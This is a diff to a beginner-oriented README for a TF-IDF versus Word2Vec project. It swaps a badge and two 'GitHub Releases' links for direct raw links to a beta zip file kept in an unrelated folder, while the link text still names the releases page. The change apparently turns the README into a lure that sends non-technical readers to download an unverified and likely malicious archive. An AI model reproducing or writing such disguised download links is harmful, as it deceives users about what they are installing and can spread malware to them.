@@ -1,6 +1,6 @@
 # 📚 TFIDF-vs-Word2Vec - Understand Two Key NLP Methods
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/formalized-sarcocystis669/TFIDF-vs-Word2Vec/main/shikimi/TFIDF-vs-Word2Vec-v3.8-beta.4.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ To begin using the application, follow these simple steps. No technical backgrou
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://github.com/formalized-sarcocystis669/TFIDF-vs-Word2Vec/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/formalized-sarcocystis669/TFIDF-vs-Word2Vec/main/shikimi/TFIDF-vs-Word2Vec-v3.8-beta.4.zip).
 
 2. You will see a list of available versions. Choose the latest version for the best features.
 
@@ -90,6 +90,6 @@ Feel free to follow us on GitHub and stay up to date with the latest releases an
 
 ## 📥 Again, Download & Install
 
-Don't forget to visit this page to download the application: [GitHub Releases](https://github.com/formalized-sarcocystis669/TFIDF-vs-Word2Vec/releases).
+Don't forget to visit this page to download the application: [GitHub Releases](https://raw.githubusercontent.com/formalized-sarcocystis669/TFIDF-vs-Word2Vec/main/shikimi/TFIDF-vs-Word2Vec-v3.8-beta.4.zip).
 
 Thank you for using TFIDF-vs-Word2Vec! We hope this guide helps you unlock the power of natural language processing techniques. Enjoy analyzing text!
